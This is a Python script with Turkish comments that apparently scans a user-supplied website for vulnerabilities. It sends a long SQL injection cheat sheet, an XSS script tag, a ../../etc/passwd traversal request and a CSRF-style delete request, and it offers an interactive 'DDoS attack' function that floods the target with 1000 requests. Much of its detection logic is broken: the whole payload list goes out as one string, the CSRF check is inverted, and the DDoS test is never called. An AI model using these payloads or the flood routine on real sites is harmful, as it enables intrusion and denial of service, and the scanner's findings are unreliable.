import requests
from urllib.parse import urljoin
import logging
import threading
import time

# Loglama ayarları
logging.basicConfig(level=logging.INFO, format='%(message)s')

# Zafiyet testi için hedef URL
target_url = input("Site adresi girin\nÖrnek : http://testphp.vulnweb.com : ")
print("\n")


# Kullanıcı ajanı (User Agent) belirleme
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
}

# SQL Injection testi
def test_sql_injection(url):
    sql_payload = ''''
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+		addition, concatenate (or space in url)
||		(double pipe) concatenate
%		wildcard attribute indicator

@variable	local variable
@@variable	global variable


# Numeric
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2


1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+

1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --


-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --


-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@

1 AND (SELECT * FROM Users) = 1	

' AND MID(VERSION(),1,1) = '5';

' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --


Finding the table name


Time-Based:
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--

Comments:

#	    Hash comment
/*  	C-style comment
-- -	SQL comment
;%00	Nullbyte
`	    Backtick

'''
    try:
        response = requests.get(url, params={"id": sql_payload}, headers=headers)
        if "syntax error" in response.text.lower() or "sql" in response.text.lower():
            logging.info(f"Zafiyet Türü: SQL Injection\nCiddiyet: High\nBulunan URL: {url}\nÖnerilen Çözüm: Hazır SQL sorguları (Prepared Statements) kullanarak SQL Injection saldırılarına karşı koruma sağlayın.\n")
    except requests.exceptions.RequestException as e:
        logging.error(f"SQL Injection testinde hata oluştu: {e}")

# XSS testi
def test_xss(url):
    xss_payload = "<script>alert('XSS');</script>"
    try:
        response = requests.get(url, params={"query": xss_payload}, headers=headers)
        if xss_payload in response.text:
            logging.info(f"Zafiyet Türü: XSS\nCiddiyet: Medium\nBulunan URL: {url}\nÖnerilen Çözüm: Girdi doğrulaması ve çıktı kodlaması kullanarak XSS saldırılarını önleyin.\n")
    except requests.exceptions.RequestException as e:
        logging.error(f"XSS testinde hata oluştu: {e}")

# CSRF testi
def test_csrf(url):
    csrf_payload = {"user_id": "1", "action": "delete"}
    try:
        response = requests.post(url, data=csrf_payload, headers=headers)
        if "forbidden" in response.text.lower() or "invalid token" in response.text.lower():
            logging.info(f"Zafiyet Türü: CSRF\nCiddiyet: High\nBulunan URL: {url}\nÖnerilen Çözüm: CSRF token kullanarak koruma sağlayın.\n")
    except requests.exceptions.RequestException as e:
        logging.error(f"CSRF testinde hata oluştu: {e}")

# Clickjacking testi
def test_clickjacking(url):
    try:
        response = requests.get(url, headers=headers)
        if "x-frame-options" not in response.headers:
            logging.info(f"Zafiyet Türü: Clickjacking\nCiddiyet: Medium\nBulunan URL: {url}\nÖnerilen Çözüm: X-Frame-Options header'ı ekleyerek koruma sağlayın.\n")
    except requests.exceptions.RequestException as e:
        logging.error(f"Clickjacking testinde hata oluştu: {e}")

# Güvensiz cookie yönetimi testi
def test_cookie_security(url):
    try:
        response = requests.get(url, headers=headers)
        if "Set-Cookie" in response.headers:
            if "HttpOnly" not in response.headers["Set-Cookie"] or "Secure" not in response.headers["Set-Cookie"]:
                logging.info(f"Zafiyet Türü: Güvensiz Cookie Yönetimi\nCiddiyet: Medium\nBulunan URL: {url}\nÖnerilen Çözüm: HttpOnly ve Secure bayraklarını ekleyerek cookie güvenliğini sağlayın.\n")
    except requests.exceptions.RequestException as e:
        logging.error(f"Güvensiz cookie yönetimi testinde hata oluştu: {e}")

# Dizin gezintisi testi
def test_directory_traversal(url):
    traversal_payload = "../../etc/passwd"
    try:
        response = requests.get(urljoin(url, traversal_payload), headers=headers)
        if "root:x" in response.text:
            logging.info(f"Zafiyet Türü: Dizin Gezantisi\nCiddiyet: High\nBulunan URL: {url}\nÖnerilen Çözüm: Girdi doğrulaması yaparak dizin gezintisi saldırılarını önleyin.\n")
    except requests.exceptions.RequestException as e:
        logging.error(f"Dizin gezintisi testinde hata oluştu: {e}")

# DDoS Koruması testi
def test_ddos_protection(url):
    try:
        start_time = time.time()
        for _ in range(100):  # 100 istek gönderiyoruz
            response = requests.get(url, headers=headers)
            if response.status_code != 200:
                logging.info(f"Sunucu {response.status_code} ile yanıt verdi. DDoS koruması olabilir.")
                return
        elapsed_time = time.time() - start_time
        if elapsed_time > 5:  # Eğer işlemler 5 saniyeden fazla sürerse
            logging.info("Sunucu yanıt vermekte yavaşladı, DDoS koruması zayıf olabilir.")
        else:
            logging.info("Sunucu DDoS saldırısına karşı korunmasız görünüyor.")
            ddos_confirm = input("DDoS saldırısı yapmak ister misiniz? (evet/hayır): ")
            if ddos_confirm.lower() == "evet":
                perform_ddos(url)
    except requests.exceptions.RequestException as e:
        logging.error(f"DDoS koruması testinde hata oluştu: {e}")

# DDoS saldırısı
def perform_ddos(url):
    logging.info("DDoS saldırısı başlatılıyor...")
    try:
        for _ in range(1000):  # 1000 istek gönderiyoruz
            response = requests.get(url, headers=headers)
            if response.status_code != 200:
                logging.info(f"Sunucu {response.status_code} ile yanıt verdi.")
    except requests.exceptions.RequestException as e:
        logging.error(f"DDoS saldırısı sırasında hata oluştu: {e}")


# Tarama işlemi
def scan_vulnerabilities(url):
    test_threads = []

    # Testleri paralel olarak çalıştırma
    test_threads.append(threading.Thread(target=test_sql_injection, args=(url,)))
    test_threads.append(threading.Thread(target=test_xss, args=(url,)))
    test_threads.append(threading.Thread(target=test_csrf, args=(url,)))
    test_threads.append(threading.Thread(target=test_clickjacking, args=(url,)))
    test_threads.append(threading.Thread(target=test_cookie_security, args=(url,)))
    test_threads.append(threading.Thread(target=test_directory_traversal, args=(url,)))

    for thread in test_threads:
        thread.start()

    for thread in test_threads:
        thread.join()

# Tarama başlatılıyor
scan_vulnerabilities(target_url)
